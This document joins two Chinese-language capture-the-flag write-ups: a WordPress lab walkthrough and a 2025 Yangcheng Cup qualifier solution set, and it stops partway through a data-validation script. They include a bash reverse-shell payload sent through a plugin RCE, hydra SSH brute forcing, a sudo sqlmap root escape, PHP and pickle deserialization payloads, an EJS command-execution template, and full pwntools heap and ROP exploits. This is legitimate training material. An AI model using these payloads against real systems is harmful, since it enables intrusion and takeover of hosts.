title: News
body:
## web打点 ![image-20250702082959738](New.assets/image-20250702082959738.png) 发现是wordpress 随便点几下跳转了`http://new.dsz` 改个hosts wordpress的话就走正常流程，wpscan扫用户爆破密码先整上，发现没什么成果 ![image-20250702083232613](New.assets/image-20250702083232613.png) 发现用了`Social Warfare v3.5.2`插件，随便一搜就找到rce https://github.com/hash3liZer/CVE-2019-9978 ```bash ┌──(root㉿kali)-[~] └─# cat payload 
system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.37/4444 0>&1'")
┌──(root㉿kali)-[~] └─# python2 wp.py -t http://new.dsz --payload-uri http://192.168.1.37/payload [>] Sending Payload to System! ┌──(root㉿kali)-[~] └─# nc -lnvp 4444 listening on [any] 4444 ... connect to [192.168.1.37] from (UNKNOWN) [192.168.1.36] 33860 bash: cannot set terminal process group (430): Inappropriate ioctl for device bash: no job control in this shell www-data@New:/var/www/new.dsz/wp-admin$ ``` 成功getshell ## 提权 ```bash www-data@New:/home$ cd /opt cd /opt www-data@New:/opt$ ls ls andeli_cred www-data@New:/opt$ ``` 在opt下有个andeli_cred可执行文件，执行输出一堆类似md5的值，尝试用这些字符串去爆破andeli用户 ```bash ┌──(root㉿kali)-[~] └─# hydra -l andeli -P 1 ssh://192.168.1.36 -vV -f -t 10 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-01 20:26:03 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 10 tasks per 1 server, overall 10 tasks, 10001 login tries (l:1/p:10001), ~1001 tries per task [DATA] attacking ssh://192.168.1.36:22/ [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [INFO] Testing if password authentication is supported by ssh://andeli@192.168.1.36:22 [INFO] Successful, password authentication is supported by ssh://192.168.1.36:22 [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "固定MD5插入位置: 665" - 1 of 10001 [child 0] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "eea0353df30b9b38f5f280db88912f91" - 2 of 10001 [child 1] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "e31195e88f31a699c9c499f129248b56" - 3 of 10001 [child 2] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "f788c604535faf9685a1ea30355b1a20" - 4 of 10001 [child 3] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "1a8d0816b7556ebe36f2022387e92093" - 5 of 10001 [child 4] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "a11b921496af55d8bdabfde74d06d9a8" - 6 of 10001 [child 5] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "ab33d487a26f748312e0fd84a8a724fc" - 7 of 10001 [child 6] (0/0) ............................ [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "5cca227ce87f76ad1728abcfbb0dd792" - 658 of 10001 [child 6] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "35d57416c953f0007381e409006d700a" - 659 of 10001 [child 1] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "5dfd113da80981a0421272c7224a2448" - 660 of 10001 [child 6] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "145258ff008912955a7cc33f6798cd0d" - 661 of 10001 [child 9] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "1506df5efe700055ad170466cff8cf5e" - 662 of 10001 [child 2] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "55425a0487587ae27f984fe0ed8add82" - 663 of 10001 [child 9] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "3d4875cfc174c5635fb9ea9c7164ef61" - 664 of 10001 [child 2] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "cb93062c7903f67452d3c6f476855f71" - 665 of 10001 [child 7] (0/0) [ATTEMPT] target 192.168.1.36 - login "andeli" - pass "9eeb22195b4eb7a35bcad0f45761eb7b" - 666 of 10001 [child 9] (0/0) [22][ssh] host: 192.168.1.36 login: andeli password: 9eeb22195b4eb7a35bcad0f45761eb7b ``` 登录ssh，三板斧，找一下suid，没发现可利用的 看一下sudo -l ```bash andeli@New:~$ find / -perm -4000 2>/dev/null /usr/bin/chsh /usr/bin/chfn /usr/bin/newgrp /usr/bin/gpasswd /usr/bin/mount /usr/bin/su /usr/bin/umount /usr/bin/pkexec /usr/bin/sudo /usr/bin/passwd /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/libexec/polkit-agent-helper-1 andeli@New:~$ sudo -l Matching Defaults entries for andeli on New: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin User andeli may run the following commands on New: (ALL) NOPASSWD: /usr/bin/sqlmap ``` 可以用root执行sqlmap ```bash andeli@New:~$ sudo sqlmap -u 127.0.0.1 --eval="import os; os.system('/bin/sh')" ___ __H__ ___ ___[)]_____ ___ ___ {1.5.2#stable} |_ -| . ["] | .'| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 20:43:51 /2025-07-01/ [20:43:51] [INFO] testing connection to the target URL # id uid=0(root) gid=0(root) groups=0(root) # ```

title: 2025羊城杯初赛部分wp
body:
## Web ### ez_unserialize 经典反序列化pop链 ![image5](./wp.assets/image5.png) ![**image6**](./wp.assets/image6.png) 我们的目标是执行U类中的system()函数，从这里反推 1. **最终执行**: U::__invoke() -> N::__call('system', ...) -> system($_POST['cmd']) - 我们需要一个U类的实例被当作函数来调用，这样就会触发__invoke()。 2. **触发 __invoke()**: F::check() - F类中的check()方法会实例化一个由$this->finalstep指定的类，并将其作为函数调用：($this->step)()。 - 我们可以将$this->finalstep设置为'u'。因为PHP的类名是大小写不敏感的，new 'u'()会成功创建U类的实例。同时，使用小写的'u'可以绕过preg_match("/U/",$this->finalstep)的检查。 3. **触发 check()**: E::__get() - E类的__get()魔术方法会在我们尝试访问其私有属性secret时被调用。 - 该方法会执行$this->found->check()。因此，我们将$this->found设置为我们构造好的F对象。 4. **触发 __get()**: V::__toString() - V类的__toString()方法会动态地访问一个属性：$this->go->$abc，其中$abc的值来自$this->dowhat。 - 我们可以将$this->go设置为我们构造的E对象，并将$this->dowhat设置为字符串'secret'。这样就会触发对$e_object->secret的访问，进而调用E::__get()。 5. **触发 __toString()**: A::start() - A类的start()方法会执行echo $this->next。当echo一个对象时，会触发该对象的__toString()方法。 - 因此，我们将$this->next设置为我们构造的V对象。 6. **触发 start()**: H::__destruct() - H类的__destruct()方法是我们的起点。当一个由unserialize()创建的对象在脚本结束时被销毁，这个方法就会被自动调用。 - 该方法会执行$this->who->start()。我们将$this->who设置为我们构造的A对象。 整个利用链就构建完成：H::_destruct() -> A::start() -> V::_toString() -> E::_get() -> F::check() -> U::__invoke() -> system() ![image7](./wp.assets/image7.png) ![image8](./wp.assets/image8.png) POC: ```php finalstep = 'u'; // 类名大小写不敏感，绕过 preg_match("/U/",...) // 2. 创建 E，它会调用 F->check() $e = new E(); $e->found = $f; // 3. 创建 V，它会触发 E::__get('secret') $v = new V(); $v->go = $e; $v->dowhat = 'secret'; // 4. 创建 A，它会触发 V::__toString() $a = new A(); $a->next = $v; // 5. 创建入口点 H，它会触发 A->start() $h = new H(); $h->who = $a; $payload = serialize($h); echo urlencode($payload); ?> ``` ### ez_blog ![image9](./wp.assets/image9.png) 使用guest用户登录这个网站，发现cookie中会有个token ![image10](./wp.assets/image10.png) 十六进制解码之后发现有guest isadmin这些字段 ![image11](./wp.assets/image11.png) 网站的后端是flask，这里的十六进制应该是序列化之后的，传到后端会将这段十六进制反序列化 我们只要构造一个恶意代码，将其序列化之后的十六进制传入就能被执行 构造一个内存马注入 ![image12](./wp.assets/image12.png) ![image13](./wp.assets/image13.png) 替换token，刷新网页 ![image14](./wp.assets/image14.png) 成功执行 ![image15](./wp.assets/image15.png) 成功getflag POC: ```python import pickle def poc(): class RCE(): def __reduce__(self): command = r"""app.after_request_funcs.setdefault(None,[]).append(lambda resp: make_response(__import__('os').popen(request.args.get('cmd')).read()) if request.args.get('cmd') else resp)""" return (eval, (command,)) return pickle.dumps(RCE()).hex() print(poc()) ``` ### staticNodeService ![image16](./wp.assets/image16.png) 在响应头中发现了express字样，后端是nodejs写的 ![image17](./wp.assets/image17.png) 给了源码，审计一下 这段 Node.js 代码实现了一个文件上传和文件浏览功能，基于Express + EJS 模板引擎实现 可以通过http put 上传文件 ![image18](./wp.assets/image18.png) 这里是安全中间件 如果 req.path 不是字符串 → 直接拒绝 如果 req.query.templ 存在且不是字符串 → 拒绝 如果路径中含 .. 或以 .js 结尾 → 拒绝访问 虽然它过滤了 ..，但并未过滤 /templ，这里可以加载任意ejs模板 ![image19](./wp.assets/image19.png) ![image20](./wp.assets/image20.png) ![image21](./wp.assets/image21.png) 成功执行命令 ![image22](./wp.assets/image22.png) ![image23](./wp.assets/image23.png) 成功getflag getflag POC: ```javascript <% // 取到 global const G = ({}).constructor.constructor('return this')(); // 通过 process.mainModule.require 拿 child_process（更稳） const cp = (G.process && G.process.mainModule && G.process.mainModule.require) ? G.process.mainModule.require('child_process') : // 备用：若 mainModule 不可用，尝试用 process.require（少见） (G.process && G.process.require ? G.process.require('child_process') : null); if (!cp) { throw new Error('cannot locate child_process via process.mainModule.require'); } const out = cp.execSync('/readflag').toString(); %> 
<%= out %>
``` ### authweb ![image1](./wp.assets/image1-1760238582300-42.png) Springboot，还有 JWT 进靶机，重定向到 "/login/dynamic-template?value=login" ![image2](./wp.assets/image2-1760238582300-43.png) 没有地方可以注册，审源码，发现用户是写死的 ![image3](./wp.assets/image3-1760238582300-44.png) 需要使用用户名生成 JWT。有 Secret ![image4](./wp.assets/image4-1760238582300-45.png) 这里没有自定义字段，要用 JWT 默认的 3 个字段。SUB，IAT，EXP。图中绿框标记的部分是自定义字段，红色标记的部分是 JWT 默认自带的字段 ![image5](./wp.assets/image5-1760238582300-46.png) 生成 JWT ![image6](./wp.assets/image6-1760238582300-47.png) JWT 定义在 Authorization 中 ![image7](./wp.assets/image7-1760238582300-48.png) 发现 Upload 路由，文件上传 ![image8](./wp.assets/image8-1760238582300-49.png) 发现文件读取 ![image9](./wp.assets/image9-1760238582300-50.png) 根据以上特征，猜测是文件上传 + SSTI 构建 Payload ![image10](./wp.assets/image10-1760238582300-51.png) ```html

``` 上传文件 ![image11](./wp.assets/image11-1760238582300-52.png) 访问 "/login/dynamic-template?value=../uploadFile/payload17"，触发 SSTI 再访问 "/login/dynamic-template?value=../uploadFile/env" 读取输出 ![image12](./wp.assets/image12-1760238608005-65.png) ## pwn ### malloc ![image24](./wp.assets/image24.png) ida分析代码 是个自制的堆管理 ![image25](./wp.assets/image25.png) 这里存在uaf 函数在释放了堆块后，没有将存储指针的qword_5200[v2 + 512]清零 这意味着指针仍然指向之前被释放的内存区域 后续的edit或show操作如果使用这个索引，就会对一块已经free的内存进行读写，从而导致UAF漏洞 ![image26](./wp.assets/image26.png) 如前所述，由于 delete 函数不清空指针，攻击者可以先 delete 一个chunk，然后再次 edit 它。这允许攻击者向一块已经释放的内存中写入任意数据。 这对于篡改 tcache 或 fastbin 中 free chunk 的 fd 指针至关重要，从而可以实现任意地址分配 nbytes[0] <= (__int64)qword_5200[v2 + 528] 这个检查似乎可以防止溢出。但是，请注意 delete 函数会将 qword_5200[v2 + 528] 设置为0 如果攻击者 delete 一个chunk后再 edit 它，此时记录的大小为0。当用户输入一个大于0的size时，nbytes[0] <= 0 的检查会失败 但如果用户输入的size是0，read函数虽然不会读取数据，但检查会通过 如果这里存在有符号和无符号比较的整数漏洞，可能会绕过检查，但从伪代码看，这个检查是比较严谨的 主要问题还是与UAF配合使用 ![image27](./wp.assets/image27.png) 攻击者可以 delete 一个chunk，此时该chunk被放入 tcache 或 fastbin 这些空闲的chunk的头部会包含指向libc堆管理区域（如 main_arena）的指针 由于 delete 后指针不清零，攻击者可以调用 show 函数打印这个已经被 free 的chunk的内容 因为puts会一直打印直到遇到NULL字节，这就可以泄露出位于 main_arena 附近的libc地址，从而绕过ASLR 写exp 尝试攻击 ![image28](./wp.assets/image28.png) ![image29](./wp.assets/image29.png) 成功getflag EXP: ```python #!/usr/bin/env python3 from pwn import * import sys context.log_level = "debug" context.binary = "./pwn" # --- Configuration ---------------------------------------------------------------- LOCAL = False REMOTE_HOST = "45.40.247.139" REMOTE_PORT = 24152 BINARY_PATH = "./pwn" LIBC_PATH = "./libc.so.6" # Offsets / constants from proto (kept from your original offsets) LEAK_TO_ELF_BASE = 0x52a0 # leak -> elf base adjust # ----------------------------------------------------------------------------------- def start_process(): elf = ELF(BINARY_PATH) if LOCAL: p = elf.process() else: p = remote(REMOTE_HOST, REMOTE_PORT) return p, elf def load_libc(): return ELF(LIBC_PATH) # --- Helpers: wrapped menu actions ------------------------------------------------- def send_choice(p, choice): p.sendlineafter(b"5:exit", str(choice).encode()) def action_add(p, index, size): send_choice(p, 1) p.sendlineafter(b"Index", str(index).encode()) p.sendlineafter(b"size", str(size).encode()) def action_free(p, index): send_choice(p, 2) p.sendlineafter(b"Index", str(index).encode()) def action_edit(p, index, size, data: bytes): send_choice(p, 3) p.sendlineafter(b"Index", str(index).encode()) p.sendlineafter(b"size", str(size).encode()) # send raw bytes (don't append newline unless desired) p.send(data) def action_show(p, index): send_choice(p, 4) p.sendlineafter(b"Index", str(index).encode()) # Robust leak helper: read until the "Success\n" marker and extract trailing bytes def recv_leak_before_success(p, num_bytes=6): # receive until newline + "Success\n", drop that terminator, then take tail leaked = p.recvuntil(b"\nSuccess\n", drop=True) # sometimes the leaked blob includes other text, so take last num_bytes return leaked[-num_bytes:].ljust(8, b'\x00') # Optional gdb attach for local debugging def attach_gdb_if_local(p): if LOCAL: gdb.attach(p) sleep(1) # --- Exploit flow ----------------------------------------------------------------- def exploit(): p, elf = start_process() libc = load_libc() try: # Stage 1: heap layout action_add(p, 0, 0x10) # chunk A action_add(p, 1, 0x70) # chunk B action_add(p, 2, 0x70) # chunk C action_add(p, 0x10, 0x10) # chunk D (index is 0x10 per your original) # free to create overlapping / fastbin action_free(p, 2) # free C action_free(p, 1) # free B # leak ELF base from show(1) action_show(p, 1) elf_leak_bytes = recv_leak_before_success(p, 6) leaked_ptr = u64(elf_leak_bytes) elf.address = leaked_ptr - LEAK_TO_ELF_BASE log.success(f"Leaked ptr: {hex(leaked_ptr)} -> ELF base: {hex(elf.address)}") # Stage 2: craft fake chunk to get control over fastbin fd # payload layout: (prev_size/padding) ... size 0x80 ... FD -> target fake_fd = elf.address + 0x5200 + 0x1010 payload = p64(0) * 3 + p64(0x80) + p64(fake_fd) action_edit(p, 0, len(payload), payload) # overwrite freed chunk's metadata # allocate two chunks to pop from fastbin (B and C) action_add(p, 3, 0x70) action_add(p, 3, 0x70) # now one of these points to our fake_fd # write GOT address of puts into chunk at index 3 (so show(4) will leak puts) action_edit(p, 3, 8, p64(elf.got["puts"])) action_show(p, 4) puts_leak_bytes = recv_leak_before_success(p, 6) puts_addr = u64(puts_leak_bytes) libc.address = puts_addr - libc.sym["puts"] log.success(f"puts@libc = {hex(puts_addr)} -> libc base = {hex(libc.address)}") # Now leak libc environ to find stack address action_edit(p, 3, 8, p64(libc.sym["environ"])) action_show(p, 4) environ_leak_blob = p.recvuntil(b"\x7f") # original used this to include 0x7f byte # Extract last 6 bytes before 0x7f (be conservative) environ_leak = environ_leak_blob[-6:].ljust(8, b"\x00") stack_leak = u64(environ_leak) - 0x140 # adjust like your script did log.success(f"libc base: {hex(libc.address)}") log.success(f"stack pivot / edit target ~ {hex(stack_leak)}") # Stage 3: prepare a chunk whose content we can control and place filename there action_add(p, 4, 0x70) action_edit(p, 3, 8, p64(elf.address + 0x62a0)) # ??? replicate your pointer overwrite action_edit(p, 4, 0x8, p64(0x100)) # write "/flag" into memory near the stack target (as in your original) action_edit(p, 3, 0x10, p64(stack_leak) + b"/flag\x00\x00\x00") # Build ROP chain for open/read/write using gadgets from libc pop_rdi = libc.address + 0x000000000002a3e5 pop_rsi = libc.address + 0x000000000002be51 pop_rdx_rbx = libc.address + 0x00000000000904a9 # pop rdx ; pop rbx ; ret flag_addr = elf.address + 0x6228 # kept from original rop = b"" rop += p64(pop_rdi) + p64(flag_addr) rop += p64(pop_rsi) + p64(0) rop += p64(libc.sym["open"]) rop += p64(pop_rdi) + p64(3) # fd rop += p64(pop_rsi) + p64(elf.address + 0x40C0 + 0x500) # buffer for read rop += p64(pop_rdx_rbx) + p64(0x50) + p64(0x50) # rdx = 0x50 ; rbx filler rop += p64(libc.sym["read"]) rop += p64(pop_rdi) + p64(1) rop += p64(libc.sym["write"]) # write ROP into chunk 4 action_edit(p, 4, len(rop), rop) # optional: attach_gdb_if_local(p) # interact p.interactive() except Exception as e: log.error(f"Exploit failed: {e}") try: p.close() except: pass raise if __name__ == "__main__": # allow quick toggle of LOCAL via commandline: `python exploit.py local` if len(sys.argv) > 1 and sys.argv[1].lower().startswith("local"): LOCAL = True exploit() ``` ### stack ![image30](./wp.assets/image30.png) p = malloc(0x1000) 分配 0x1000 字节（4096） memset(p, 0, 0x2000)，从 p 开始写入 0x2000（8192）字节 直接越界写入 0x1000（4096）字节到 p 之后的内存 然后 buf = buf - 672：把 buf 指向分配块的前面 672 字节处 等于 p - 0x2A） 也就是说，后续所有以 buf 为基址的偏移都可以访问并覆盖 p 之前的数据 算 qword_4018 = buf + 256。注意 ((QWORD*)buf)[32] 的位置（32*8 = 256）恰好是 buf+256 程序把 *((QWORD*)buf + 32) = buf + 4096（在该偏移写入 buf+4096） 接着又写 *(qword_4018 + 8) = sub_132E（也就是在 buf+264 写入函数指针 sub_132E） 程序预写了两处重要的指针到 buf 偏移 256/264 但是 recall 之前对 buf 的 memset 和后面 read(0, buf, 0x2000) 都会覆盖这些位置 攻击者可以把这些位置写成任意值或伪造结构 ![image31](./wp.assets/image31.png) read(0, buf, 0x2000) 从 stdin 读入 0x2000 字节到 bu fbuf 是 p - 672，read 会覆盖一大片内存，包括堆元、全局区、可能的 libc 指针表等 qword_4028 用于计数：如果 >2 则退出 最多 3 次触发 read 的机会 直接写脚本打 ![image32](./wp.assets/image32.png) ![image33](./wp.assets/image33.png) EXP： ```python from pwn import * import ctypes import time # ---- Configuration ---- HOST = '45.40.247.139' PORT = 25875 LIBC_PATH = './libc.so.6' LOG_LEVEL = 'debug' # ---- pwntools context ---- context.update(os='linux', arch='amd64', log_level=LOG_LEVEL) # ---- Helpers / small wrapper API to make intentions clear ---- def remote_conn(host=HOST, port=PORT): """Open a remote connection and return the pwntools tube.""" return remote(host, port) def u64_from_recvuntil(tube, marker, timeout=5): """Receive until marker and parse a 6-byte little-endian pointer into u64. Returns an integer address or raises on failure. """ data = tube.recvuntil(marker, timeout=timeout) # take last 6 bytes then pad to 8 return u64(data[-6:].ljust(8, b"\x00")) def u32_from_recvuntil(tube, marker, byte_end=b'\xf7', timeout=5): """Legacy helper kept for compatibility with original script (u32 ending with 0xf7). Finds bytes until provided byte_end and returns u32 from the tail 4 bytes. """ data = tube.recvuntil(marker, timeout=timeout) return u32(data[-4:]) # ---- libc helpers (ctypes for rand/srand, ELF for symbols) ---- libc_elf = ELF(LIBC_PATH) libc_c = ctypes.CDLL(LIBC_PATH) def seeded_rand_mod(threshold=3, modulo=5): """Seed libc rand() with current time and run until rand()%modulo > threshold. Returns the chosen rand() and its modulo result. (keeps the original exploit logic but makes it explicit) """ # seed with current time (same as srand(time(0)) in C) libc_c.srand(int(libc_c.time(0))) while True: r = libc_c.rand() r_mod = r % modulo log.debug(f"libc rand() = {r}, rand()%{modulo} = {r_mod}") if r_mod > threshold: return r, r_mod # ---- Main exploit flow (structured) ---- def exploit(): p = remote_conn() # compact, descriptive recv/send wrappers def recv_until(marker): return p.recvuntil(marker) def send_raw(data): p.send(data) def send_line(data): p.sendline(data) # ---------------- Stage 1: initial interaction and parsing ---------------- recv_until(b'Good luck!') # Original script sends 0x108 bytes then a single byte 0x5f, replicate clearly padding = b'a' * 0x108 + b'\x5f' send_raw(padding) # the service prints "magic number:" then a decimal address recv_until(b'magic number:') # read up to 15 bytes of ASCII decimal then parse to int addr_str = p.recv(15).strip() target_addr = int(addr_str, 10) log.info(f"received magic number (addr) = {hex(target_addr)}") # ---------------- Stage 2: use libc rand() to pick a divider ---------------- _, rand_mod = seeded_rand_mod(threshold=2, modulo=5) log.info(f"using rand()%5 = {rand_mod} as divider") # avoid division by zero / invalid values if rand_mod == 0: raise RuntimeError("rand()%5 produced 0 unexpectedly") main_value = target_addr // rand_mod log.info(f"computed main_value = {hex(main_value)}") # compute PIE base from known offset (original offset 0x16b0) PIE_OFFSET = 0x16b0 pie_base = main_value - PIE_OFFSET log.info(f"guessed PIE base = {hex(pie_base)}") # useful gadget offsets used by original exploit SYSCALL_OFFSET = 0x134f GADGET_OFFSET_A = 0x12E8 GADGET_OFFSET_B = 0x163A syscall_addr = pie_base + SYSCALL_OFFSET gadget_a = pie_base + GADGET_OFFSET_A gadget_b = pie_base + GADGET_OFFSET_B # ---------------- Stage 3: leak libc via controlled ROP ---------------- # send second stage payload (similar to original): first overflow + two gadgets recv_until(b'Good luck!') send_raw(b'a' * 0x108 + p64(gadget_a) + p64(gadget_b) * 2) # parse leaked address from stdout structure leaked = u64_from_recvuntil(p, b'\x7f') libc_base = leaked - libc_elf.sym['_IO_2_1_stdout_'] log.success(f"libc base = {hex(libc_base)}") # prepare common ROP gadgets from libc (search relative to libc_base) def gadget(name_bytes): # assemble a small in-memory search for instruction sequences; prefers pwntools search it = libc_elf.search(name_bytes) return libc_base + next(it) pop_rax = gadget(asm('pop rax\nret')) pop_rdi = gadget(asm('pop rdi\nret')) pop_rsi = gadget(asm('pop rsi\nret')) # rdx sometimes not available; original used a constant offset pop_rdx_val = libc_base + 0x00000000000a85a9 # system and /bin/sh addresses system_addr = libc_base + libc_elf.sym['system'] binsh_addr = libc_base + next(libc_elf.search(b'/bin/sh\x00')) log.info(f"system = {hex(system_addr)}, /bin/sh = {hex(binsh_addr)}") # ---------------- Stage 4: build final ROP + syscall chain ---------------- # original script built a complex sequence to mprotect and read+send with sendfile # we keep the structure but clarify registers being set rop = b'' rop += b'a' * 0x118 rop += p64(pop_rsi) # pop rsi; rsi = writable address (pie+0x4500) rop += p64(pie_base + 0x4500) rop += p64(pop_rax) # pop rax; rax = 0 rop += p64(0) rop += p64(syscall_addr) * 2 # perform two syscalls in original script rop += p64(pop_rdi) rop += p64(pie_base + 0x4000) # rdi -> filename or fd depending on chain rop += p64(pop_rsi) rop += p64(0x1000) # rsi = size/prot rop += p64(pop_rdx_val) # set rdx via fixed gadget/address used earlier rop += p64(7) * 3 # filler from original rop += p64(pop_rax) rop += p64(0xa) # syscall number for mprotect / open? (as in original) rop += p64(syscall_addr) rop += p64(pop_rax) # reuse pop_rax as a RSP pivot (original used this) rop += p64(pie_base + 0x4500) # send the constructed ROP payload send_raw(rop) # optional pause for debugging (comment out for automated runs) # pause() # small shellcode used originally; keep for compatibility but written clearly shellcode = asm( "mov rax, 0x67616c662f\n" # push "/flagg" (example from original) "push rax\n" "xor rdi, rdi\n" "sub rdi, 100\n" "mov rsi, rsp\n" "xor edx, edx\n" "xor r10, r10\n" "push SYS_openat\n" "pop rax\n" "syscall\n" "mov rdi, 1\n" "mov rsi, 3\n" "push 0\n" "mov rdx, rsp\n" "mov r10, 0x100\n" "push SYS_sendfile\n" "pop rax\n" "syscall\n" ) send_raw(shellcode) # hand off to interactive so user can use the obtained shell p.interactive() if __name__ == '__main__': try: exploit() except Exception as e: log.error(f"exploit failed: {e}") raise ``` ## Reverse ### GD1 gdretools反编译exe ![image1](./wp.assets/image1.png) 发现enc ![image2](./wp.assets/image2.png) 这里是enc的加密逻辑 - 每次计时器触发，分数加 1。 - 当分数 达到 7906*时，执行隐藏解码逻辑 - 把字符串 a 分成 12 位一组（即 3 个 4 位二进制数字） - 前 4 位 → 百位数 - 中 4 位 → 十位数 - 后 4 位 → 个位数 - 拼成一个三位数 ASCII 码 - 最终得到一串可读字符 result 并显示出来 写脚本解密这个二进制 ![image3](./wp.assets/image3.png) 成功解密flag EXP: ```python a = "" result = "" for i in range(0, len(a), 12): bin_chunk = a[i:i+12] hundreds = int(bin_chunk[0:4], 2) tens = int(bin_chunk[4:8], 2) units = int(bin_chunk[8:12], 2) ascii_value = hundreds * 100 + tens * 10 + units result += chr(ascii_value) print(result) ``` ### PLUS ![image4](./wp.assets/image4.png) 给了个python文件和inti.pyd 脚本使用了init中的 m、i、p 和 b 函数 b() 函数出现在最终的条件判断中，并且其结果被 .decode()，这强烈暗示 b() 的返回值是一个字节串（bytes），解码后会变成一个字符串（string） p() 函数在 if/else 的两个分支中都被调用，传入的参数不同，猜测是用来判断flag if (b(m(...)).decode() == exec(exit(...))): 左边 b(m(...)).decode()： 这部分很可能是通过一系列复杂的计算生成的flag 右边 exec(exit(...))： 这是一个单独的整数计算 这个值是用来和左边的解密结果进行比较的 ida反编译init.pyd ![image-20251012104907727](./wp.assets/image-20251012104907727.png) 找到了这些函数的定义 分析代码 代码实现了一个基于映射表的替换解密算法 输入是一个十六进制字符串 s，以空格为分隔符。 通过 s.split() 将其解析为一个十六进制字符串列表 lst。此列表构成了待解密的密文单元序列。脚本预定义了一个明文字符集 s (a-z, A-Z, 0-9, 等) 和一个字节序列 b。 通过迭代这两个序列，程序构建了一个字典 d，其键（key）是 b 中的字节值，值（value）是 s 中对应位置的字符。这个字典本质上是一个从加密后的字节到原始明文字符的逆向查找表（byte -> char）。 脚本遍历 lst 中的每一个十六进制字符串。 对每个元素，使用 int(hex_string, 16) 将其从十六进制表示转换为整数形式的字节值。 将此字节值作为键在字典 d 中进行查找，获取其映射的原始明文字符。 将所有检索到的字符顺序拼接，最终还原出完整的明文 写脚本解密 ![image-20251012110144833](./wp.assets/image-20251012110144833.png) exp: ```python s = [ 0xe3, 0x6e, 0x4c, 0xbc, 0x73, 0x31, 0xb4, 0xba, 0x99, 0xde, 0xdc, 0xb7, 0x45, 0x99, 0x30, 0xde, 0x6c, 0x30, 0xba, 0x53, 0x51, 0x8e, 0x4b, 0x30, 0x6e, 0x99, 0x03, 0x30, 0xaf, 0xb7, 0x08, 0x30, 0x8e, 0xb5, 0xb7, 0xba, 0x93, 0x30, 0x2a, 0x3f, 0x2a, 0xdc, 0x10, 0x02 ] b = [ 0x8e, 0xb5, 0xdc, 0x03, 0x2a, 0x51, 0x78, 0xaf, 0xd6, 0xfd, 0x24, 0x4b, 0x72, 0x99, 0xc0, 0xf7, 0x1e, 0x45, 0x6c, 0x93, 0xba, 0xe1, 0x08, 0x3f, 0x66, 0x8d, 0x6e, 0x95, 0xbc, 0xe3, 0x0a, 0x31, 0x58, 0x8f, 0xb6, 0xdd, 0x04, 0x2b, 0x52, 0x79, 0xa0, 0xd7, 0xfe, 0x25, 0x4c, 0x73, 0x9a, 0xc1, 0xe8, 0x1f, 0x46, 0x6d, 0xb7, 0xde, 0x05, 0x2c, 0x53, 0x7a, 0xa1, 0xc8, 0xff, 0x26, 0xb4, 0x02, 0x30, 0x32, 0x10 ] charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-?' mapping = {byte_val: charset[i] for i, byte_val in enumerate(b) if i < len(charset)} result = [mapping.get(x, '?') for x in s] flag = ''.join(result) print(flag) ``` ## DS&Ai ### dataIdSort 参考文档内数据格式编写脚本 最后脚本: ```python # -*- coding: utf-8 -*- import re import csv from datetime import datetime # --- 数据校验规范中定义的常量 --- # 手机号前三位号段集合 PHONE_PREFIXES = { "134", "135", "136", "137", "138", "139", "147", "148", "150", "151", "152", "157", "158", "159", "172", "178", "182", "183", "184", "187", "188", "195", "198", "130", "131", "132", "140", "145", "146", "155", "156", "166", "167", "171", "175", "176", "185", "186", "196", "133", "149", "153", "173", "174", "177", "180", "181", "189", "190", "191", "193", "199" } # 身份证号前17位加权系数 ID_CARD_WEIGHTS = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2] # 身份证号校验码映射关系 (余数 0-10 对应) ID_CARD_CHECKSUM = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2'] # --- 各类数据校验函数 --- def is_valid_idcard(s: str) -> bool: """校验身份证号码是否有效。""" cleaned_s = s.replace(" ", "").replace("-", "") if len(cleaned_s) != 18: return False if not cleaned_s[:17].isdigit() or not (cleaned_s[17].isdigit() or cleaned_s[17].upper() == 'X'): return False try: datetime.strptime(cleaned_s[6:14], '%Y%m%d') except ValueError: return False s_sum = sum(int(cleaned_s[i]) * ID_CARD_WEIGHTS[i] for i in range(17)) expected_checksum = ID_CARD_CHECKSUM[s_sum % 11] return cleaned_s[17].upper() == expected_checksum def is_valid_phone(s: str) -> bool: """校验手机号码是否有效。""" temp_s = s.strip() if temp_s.startswith("+86"): temp_s = temp_s[3:].strip() elif temp_s.startswith("(+86)"): temp_s = temp_s[5:].strip() cleaned_s = temp_s.replace(" ", "").replace("-", "") return len(cleaned_s) == 11 and cleaned_s.isdigit() and cleaned_s[:3] in PHONE_PREFIXES def 